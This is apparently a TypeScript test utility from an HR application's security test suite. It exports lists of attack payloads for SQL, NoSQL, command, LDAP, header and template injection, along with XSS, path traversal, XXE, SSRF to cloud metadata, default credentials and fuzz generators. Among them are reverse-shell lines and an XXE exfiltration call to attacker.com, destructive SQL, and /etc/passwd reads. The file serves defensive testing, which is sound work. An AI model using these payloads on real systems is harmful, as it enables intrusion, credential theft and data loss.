// tests/utils/attack-payloads.ts

/**
 * LAC VIET HR - Attack Payloads for Security Testing
 * Collection of malicious payloads for penetration testing
 */

// ════════════════════════════════════════════════════════════════════════════════
// SQL INJECTION PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const SQL_INJECTION_PAYLOADS = [
  // Basic SQL Injection
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "admin'--",
  "admin' #",
  "admin'/*",

  // Union-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL, NULL--",
  "' UNION SELECT NULL, NULL, NULL--",
  "' UNION SELECT * FROM users--",
  "1' UNION SELECT username, password FROM users--",

  // Error-based
  "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
  "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",

  // Blind SQL Injection
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND SLEEP(5)--",
  "' AND BENCHMARK(10000000,MD5('test'))--",
  "'; WAITFOR DELAY '0:0:5'--",

  // Stacked queries
  "'; DROP TABLE users--",
  "'; INSERT INTO users VALUES ('hacked')--",
  "'; UPDATE users SET password='hacked'--",

  // PostgreSQL specific
  "'; SELECT pg_sleep(5)--",
  "' || pg_sleep(5)--",

  // MySQL specific
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
];

// ════════════════════════════════════════════════════════════════════════════════
// XSS PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert(1)</script>',
  '<script>alert("XSS")</script>',
  '<script>alert(document.cookie)</script>',

  // Event handlers
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<video src=x onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',

  // Encoded payloads
  '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
  '<script>\\u0061lert(1)</script>',

  // JavaScript URI
  'javascript:alert(1)',
  'javascript:alert(document.domain)',

  // Data URI
  '<a href="data:text/html,<script>alert(1)</script>">click</a>',

  // SVG-based
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1)>',

  // Polyglot
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',

  // DOM-based
  '#<script>alert(1)</script>',

  // Template injection
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  '#{alert(1)}',
];

// ════════════════════════════════════════════════════════════════════════════════
// NOSQL INJECTION PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const NOSQL_INJECTION_PAYLOADS = [
  // MongoDB
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "sleep(5000)"}',
  '{"$regex": ".*"}',

  // Operator injection
  { $gt: '' },
  { $ne: null },
  { $exists: true },
  { $regex: '.*' },

  // JavaScript injection
  '"; return true; //',
  '1; return true; //',
];

// ════════════════════════════════════════════════════════════════════════════════
// COMMAND INJECTION PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const COMMAND_INJECTION_PAYLOADS = [
  // Basic command chaining
  '; ls -la',
  '| ls -la',
  '`ls -la`',
  '$(ls -la)',
  '&& ls -la',
  '|| ls -la',

  // Blind injection
  '; sleep 5',
  '| sleep 5',
  '`sleep 5`',
  '$(sleep 5)',

  // Windows commands
  '& dir',
  '| dir',
  '; dir',

  // Reading files
  '; cat /etc/passwd',
  '| cat /etc/passwd',
  '`cat /etc/passwd`',
  '$(cat /etc/passwd)',

  // Reverse shell attempts (for detection only)
  '; nc -e /bin/sh attacker.com 1234',
  '| bash -i >& /dev/tcp/attacker.com/1234 0>&1',
];

// ════════════════════════════════════════════════════════════════════════════════
// PATH TRAVERSAL PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const PATH_TRAVERSAL_PAYLOADS = [
  // Basic traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system.ini',

  // Encoded
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',

  // Double encoding
  '....//....//....//etc/passwd',
  '....\\\\....\\\\....\\\\windows\\\\system.ini',

  // Null byte
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',

  // Wrapper bypass
  '....//....//....//etc/passwd',
  '..//..//..//etc/passwd',
];

// ════════════════════════════════════════════════════════════════════════════════
// LDAP INJECTION PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(&',
  '*)(uid=*))(|(uid=*',
  '*()|&\'',
  'admin)(&)',
  'admin)(|(password=*))',
  '*)((|userPassword=*)',
];

// ════════════════════════════════════════════════════════════════════════════════
// XML/XXE PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const XXE_PAYLOADS = [
  // Basic XXE
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,

  // External DTD
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`,

  // Blind XXE
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/?data=test">%xxe;]><foo>test</foo>`,

  // SSRF via XXE
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
];

// ════════════════════════════════════════════════════════════════════════════════
// SSTI (SERVER-SIDE TEMPLATE INJECTION) PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const SSTI_PAYLOADS = [
  // Detection
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '#{7*7}',
  '*{7*7}',

  // Jinja2/Twig
  '{{config}}',
  '{{self.__class__.__mro__}}',
  "{{''.__class__.__mro__[2].__subclasses__()}}",

  // Freemarker
  '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',

  // Velocity
  '#set($str=$class.inspect("java.lang.String").type)',
];

// ════════════════════════════════════════════════════════════════════════════════
// SSRF PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const SSRF_PAYLOADS = [
  // Local addresses
  'http://localhost/',
  'http://127.0.0.1/',
  'http://[::1]/',
  'http://0.0.0.0/',
  'http://127.1/',

  // Cloud metadata
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal/',
  'http://100.100.100.200/latest/meta-data/',

  // Internal networks
  'http://192.168.1.1/',
  'http://10.0.0.1/',
  'http://172.16.0.1/',

  // Protocol bypass
  'file:///etc/passwd',
  'gopher://localhost:25/',
  'dict://localhost:11211/',

  // IP obfuscation
  'http://2130706433/', // 127.0.0.1 in decimal
  'http://0x7f000001/', // 127.0.0.1 in hex
  'http://127.0.0.1.nip.io/',
];

// ════════════════════════════════════════════════════════════════════════════════
// AUTHENTICATION BYPASS PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const AUTH_BYPASS_PAYLOADS = {
  emails: [
    'admin@company.com',
    'administrator@company.com',
    'root@company.com',
    'admin@admin.com',
    'test@test.com',
  ],
  passwords: [
    'admin',
    'password',
    'password123',
    '123456',
    'admin123',
    'root',
    'test',
    'guest',
    'default',
  ],
};

// ════════════════════════════════════════════════════════════════════════════════
// HEADER INJECTION PAYLOADS
// ════════════════════════════════════════════════════════════════════════════════

export const HEADER_INJECTION_PAYLOADS = [
  'test\r\nX-Injected: header',
  'test\nX-Injected: header',
  'test%0d%0aX-Injected:%20header',
  'test%0aX-Injected:%20header',
];

// ════════════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS
// ════════════════════════════════════════════════════════════════════════════════

export function generateFuzzPayloads(baseValue: string): string[] {
  return [
    baseValue,
    baseValue + "'",
    baseValue + '"',
    baseValue + '`',
    baseValue + '<',
    baseValue + '>',
    baseValue + '\\',
    baseValue + '/',
    baseValue + '%00',
    baseValue + '%0a',
    baseValue + '%0d',
    baseValue.repeat(1000), // Buffer overflow attempt
    'A'.repeat(10000), // Large input
    '', // Empty input
    ' ', // Whitespace only
    '\t\n\r', // Special whitespace
  ];
}

export function generateNumericFuzzPayloads(): (number | string)[] {
  return [
    0,
    -1,
    -999999999,
    999999999,
    2147483647, // Max int32
    2147483648, // Max int32 + 1
    -2147483648, // Min int32
    -2147483649, // Min int32 - 1
    9007199254740991, // Max safe integer
    9007199254740992, // Max safe integer + 1
    Infinity,
    -Infinity,
    NaN,
    'NaN',
    'Infinity',
    '1e308',
    '1e-308',
    '0x1',
    '0o1',
    '0b1',
  ];
}

export default {
  SQL_INJECTION_PAYLOADS,
  XSS_PAYLOADS,
  NOSQL_INJECTION_PAYLOADS,
  COMMAND_INJECTION_PAYLOADS,
  PATH_TRAVERSAL_PAYLOADS,
  LDAP_INJECTION_PAYLOADS,
  XXE_PAYLOADS,
  SSTI_PAYLOADS,
  SSRF_PAYLOADS,
  AUTH_BYPASS_PAYLOADS,
  HEADER_INJECTION_PAYLOADS,
  generateFuzzPayloads,
  generateNumericFuzzPayloads,
};
